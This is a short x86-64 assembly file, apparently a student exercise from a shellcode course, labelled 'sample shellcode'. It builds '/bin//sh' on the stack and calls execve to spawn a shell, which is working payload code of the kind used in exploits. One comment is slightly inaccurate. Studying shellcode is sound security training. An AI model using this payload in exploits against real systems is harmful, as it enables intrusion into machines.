; Andrea Bruna SLAE64 - 1493
; sample shellcode  

global _start

section .text

_start:

	xor rsi,rsi ; clear rax
	push rsi ; and push it in the stack to terminate the following string with 0

	mov rbx, 0x68732f2f6e69622f ; "/bin//sh" in reverse order
	push rbx ; string pushed in the stack

	mov rdi, rsp ; save the address of the command "/bin//sh"" in rdi

	imul rsi ; rsi, rax and edx = 0

	add al,59
	syscall ; execve
	
